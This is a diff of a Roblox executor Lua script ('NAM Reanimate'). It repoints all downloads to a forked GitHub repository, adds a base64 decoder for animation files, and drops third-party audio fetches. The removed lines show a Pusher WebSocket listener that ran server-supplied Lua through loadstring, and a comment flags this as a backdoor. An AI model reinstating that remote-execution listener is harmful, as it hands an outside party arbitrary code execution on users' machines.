@@ -37,7 +37,8 @@ local ContextActionService = cloneref(game:GetService("ContextActionService"))
 -- MOBİL TESPİT VE UI ÖLÇEKLEME
 local IsMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
 local UI_SCALE = IsMobile and 1.3 or 1.0
-local IsTablet = IsMobile and (UserInputService:GetScreenSize and UserInputService:GetScreenSize().X > 900 or false)
+local currentCamera = workspace.CurrentCamera
+local IsTablet = IsMobile and currentCamera ~= nil and currentCamera.ViewportSize.X > 900 or false
 if IsTablet then UI_SCALE = 1.5 end
 
 local Util = {}
@@ -272,7 +273,7 @@ end
 Util.ForceTextSize = function(inst)
 if inst:IsA("TextLabel") then
 local original = inst.TextSize
-local conn conn = RunService.PreRender:Connect(function()
+local conn = RunService.PreRender:Connect(function()
 local size = GuiService.PreferredTextSize.Name
 if size == "Medium" then
 inst.TextSize = original
@@ -463,7 +464,7 @@ TweenService:Create(Downloading, TweenInfo.new(0.5), {
 Size = UDim2.new(1, 0, 0, 32)
 }):Play()
 task.wait(0.5)
-local s, assetsof = pcall(game.HttpGet, game, "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/uiassets/")
+local s, assetsof = pcall(game.HttpGet, game, "https://api.github.com/repos/BursaliAlperen/RobuNexa/contents/uiassets/?ref=1bc7db7dde1f2c2594852f1205c97219ce759bf5")
 if s and assetsof then
 s, assetsof = pcall(HttpService.JSONDecode, HttpService, assetsof)
 if s and assetsof then
@@ -5934,6 +5935,26 @@ end
 local function EnsureUrlEncode(source)
 return source:gsub("[^%w%-%._~/]", function(c) return string.format("%%%02X", string.byte(c)) end)
 end
+local function DecodeBase64(data)
+local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local out, buffer, bits = {}, 0, 0
+for i = 1, #data do
+local c = data:sub(i, i)
+if c == "=" then break end
+local value = string.find(chars, c, 1, true)
+if value then
+buffer = buffer * 64 + value - 1
+bits += 6
+if bits >= 8 then
+bits -= 8
+local byte = math.floor(buffer / 2 ^ bits) % 256
+out[#out + 1] = string.char(byte)
+buffer = buffer % 2 ^ bits
+end
+end
+end
+return table.concat(out)
+end
 local function AssetDownloadAgent(source, filename, path)
 if isfile(path) then return true end
 if _Assetdownloading[filename] then return false end
@@ -5945,7 +5966,11 @@ local s, resp = pcall(request, {Method = "GET", Url = source})
 if s and resp and resp.StatusCode == 200 then
 _Assetdownloadingcount -= 1
 _UpdateDownloadStatus()
-pcall(writefile, path, resp.Body)
+local body = resp.Body
+if source:find("raw.githubusercontent.com/BursaliAlperen/RobuNexa/") and source:find("/Animations/R6/") and source:sub(-5) == ".anim" then
+body = DecodeBase64(body)
+end
+pcall(writefile, path, body)
 task.wait(10)
 else
 _Assetdownloadingcount -= 1
@@ -5960,14 +5985,14 @@ end)
 return false
 end
 local function AssetDownload(filename)
-local source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/content/" .. EnsureUrlEncode(filename)
+local source = "https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/content/" .. EnsureUrlEncode(filename)
 local split = string.split(filename, "@")
 if #split > 1 then
 filename = table.remove(split, 1)
 source = table.concat(split, "@")
 end
 if source:sub(1, 7) == "MARKET/" then
-source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/" .. EnsureUrlEncode(source:sub(8))
+source = "https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/store/" .. EnsureUrlEncode(source:sub(8))
 end
 local path = AssetGetPathFromFilename(filename)
 return AssetDownloadAgent(source, filename, path)
@@ -6758,7 +6783,7 @@ UI.CreateText(CreditsPage, "This \"software\" is FREE, meaning YOU SHOULD NOT RE
 UI.CreateText(CreditsPage, "If you want to add content to NAM, like Dances or Movesets, go to <font color=\"#4444FF\">this thing</font>.", 15, Enum.TextXAlignment.Center).InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 Util.UINotify("Link copied!")
-pcall(setclipboard, "https://github.com/STEVE-916-create/Uhhhhhh/")
+pcall(setclipboard, "https://github.com/BursaliAlperen/RobuNexa/")
 end
 end)
 UI.CreateSeparator(CreditsPage)
@@ -6800,7 +6825,7 @@ task.spawn(function()
 UI.CreateText(ChangelogsPage, "Changelogs", 30, Enum.TextXAlignment.Center)
 local content = UI.CreateText(ChangelogsPage, "Loading...", 12, Enum.TextXAlignment.Left)
 xpcall(function()
-local logs = game:HttpGet("https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/CHANGELOGS")
+local logs = game:HttpGet("https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/CHANGELOGS")
 content.Text = "Rendering error."
 for _,v in string.split(logs, "\n") do
 if v:sub(1, 2) == "# " then UI.CreateText(ChangelogsPage, "<b>" .. v:sub(3) .. "</b>", 15, Enum.TextXAlignment.Left)
@@ -6833,13 +6858,13 @@ end)
 local InitLogsText = UI.CreateText(InitLogsPage, "Loading...", 12, Enum.TextXAlignment.Left)
 local function _contentgetgithubraw(path)
 InitLogsText.Text ..= "\n[LOG] [GitGET] GET api./" .. path
-local s, resp = pcall(request, {Method = "GET", Url = "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/content/" .. path, Headers = {Accept = "application/vnd.github.VERSION.raw"}})
+local s, resp = pcall(request, {Method = "GET", Url = "https://api.github.com/repos/BursaliAlperen/RobuNexa/contents/content/" .. path .. "?ref=1bc7db7dde1f2c2594852f1205c97219ce759bf5", Headers = {Accept = "application/vnd.github.VERSION.raw"}})
 if s and resp and resp.StatusCode == 200 then return resp.Body end
 if s and resp then InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " " .. resp.StatusCode
 elseif s then InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " NIL"
 else InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " ERR " .. resp end
 InitLogsText.Text ..= "\n[LOG] [GitGET] GET raw./" .. path
-s, resp = pcall(request, {Method = "GET", Url = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/content/" .. path})
+s, resp = pcall(request, {Method = "GET", Url = "https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/content/" .. path})
 if s and resp and resp.StatusCode == 200 then return resp.Body end
 if s and resp then InitLogsText.Text ..= "\n[WARN] [GitGET] GET raw./" .. path .. " " .. resp.StatusCode
 elseif s then InitLogsText.Text ..= "\n[WARN] [GitGET] GET raw./" .. path .. " NIL"
@@ -6854,13 +6879,13 @@ ClearModules()
 table.clear(UserModulesListor)
 Util.UINotify("Checking hashes...", 0.05)
 InitLogsText.Text ..= "\n[LOG] Checking SHA1 hashes..."
-local filesofbuiltins = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua", "d_limbmap.lua", "d_hatsmap.lua"}
-local filesofbuiltins_m = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua"}
+local filesofbuiltins = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua", "v_robunexa_anime.lua", "d_limbmap.lua", "d_hatsmap.lua"}
+local filesofbuiltins_m = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua", "v_robunexa_anime.lua"}
 local filesofbuiltins_d = {"d_limbmap.lua", "d_hatsmap.lua"}
 SaveData.ContentHash = SaveData.ContentHash or {}
 if force ~= "SKIPHASH" then
 xpcall(function()
-local s, resp = pcall(request, {Method = "GET", Url = "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/content/"})
+local s, resp = pcall(request, {Method = "GET", Url = "https://api.github.com/repos/BursaliAlperen/RobuNexa/contents/content/?ref=1bc7db7dde1f2c2594852f1205c97219ce759bf5"})
 if s and resp and resp.StatusCode == 200 then
 s, resp = pcall(HttpService.JSONDecode, HttpService, resp.Body)
 if s and resp then
@@ -7026,7 +7051,7 @@ local GetMarketList_cache = {}
 local function GetMarketList()
 local aitemus, file2name, file2aitemu = GetMarketList_cache.aitemus, GetMarketList_cache.file2name, GetMarketList_cache.file2aitemu
 if not aitemus or not file2name or not file2aitemu then
-local marketteresult = game:HttpGet("https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/list.txt")
+local marketteresult = game:HttpGet("https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/store/list.txt")
 marketteresult = string.split(marketteresult, "\n")
 aitemus = {}
 local aitemu = {}
@@ -7038,7 +7063,7 @@ if k == "name" then aitemu.Name = v continue end
 if k == "user" then aitemu.User = v continue end
 if k == "desc" then aitemu.Description = v continue end
 if k == "cost" then aitemu.Cost = v continue end
-if k == "file" then aitemu.Source = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh-Store/main/" .. v aitemu.File = string.gsub(v, "/", ".") continue end
+if k == "file" then aitemu.Source = "https://raw.githubusercontent.com/BursaliAlperen/RobuNexa/1bc7db7dde1f2c2594852f1205c97219ce759bf5/store/" .. v aitemu.File = string.gsub(v, "/", ".") continue end
 end
 if next(aitemu) == nil then continue end
 table.insert(aitemus, aitemu)
@@ -7264,11 +7289,8 @@ task.wait(1.5)
 Util.UINotify("just kidding lol")
 task.wait(8)
 end
-local checkfiles = {
-["Dances/myuu.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/myuu.mp3"),
-["Dances/emoboy.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/emoboy.mp3"),
-["KDV3/Sphere.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Solary-3/Scripts/refs/heads/Audios-1/Sphere.mp3"),
-}
+-- Avoid fetching unrelated third-party audio merely to compare local files.
+local checkfiles = {}
 local function checkfile(id)
 if isfile(id) then
 local content = checkfiles[id]
@@ -7363,44 +7385,9 @@ task.wait(1)
 end
 end
 end
-if WebSocket and WebSocket.connect then while task.wait(1) do
-local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
-if look then
-local isok = true
-local function send_event(name, data)
-look:Send(HttpService:JSONEncode({event = name, data = data}))
-end
-local lastcheck = os.clock()
-local sentping = false
-look.OnMessage:Connect(function(frame)
-frame = HttpService:JSONDecode(frame)
-local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
-lastcheck = os.clock()
-if name == "stevesays" then Util.UINotify(data.content) end
-if name == "jumpscare" then
-local f = loadstring(data.content)
-GiveFunctionsToFunction(f)
-f()
-end
-end)
-task.spawn(function()
-while isok do
-local t = os.clock() - lastcheck
-if t > 120 then
-if not sentping then send_event("pusher:ping", {}) end
-sentping = true
-else
-sentping = false
-end
-if t > 150 then isok = false look:Close() end
-task.wait()
-end
-end)
-task.wait(1)
-send_event("pusher:subscribe", {channel = "uhhhhhh-secrets"})
-send_event("pusher:subscribe", {channel = "uhhhhhh-secrets-" .. Player.UserId})
-while isok do task.wait() end
-end
-end end
+-- RobuNexa security migration:
+-- Removed the legacy Pusher listener. The old "jumpscare" event compiled and
+-- executed arbitrary server-supplied Lua with NAM functions in its environment.
+-- Do not re-enable remote loadstring execution.
 end d()
 print("NAM Reanimate V" .. NAMVersion .. " loaded successfully!")
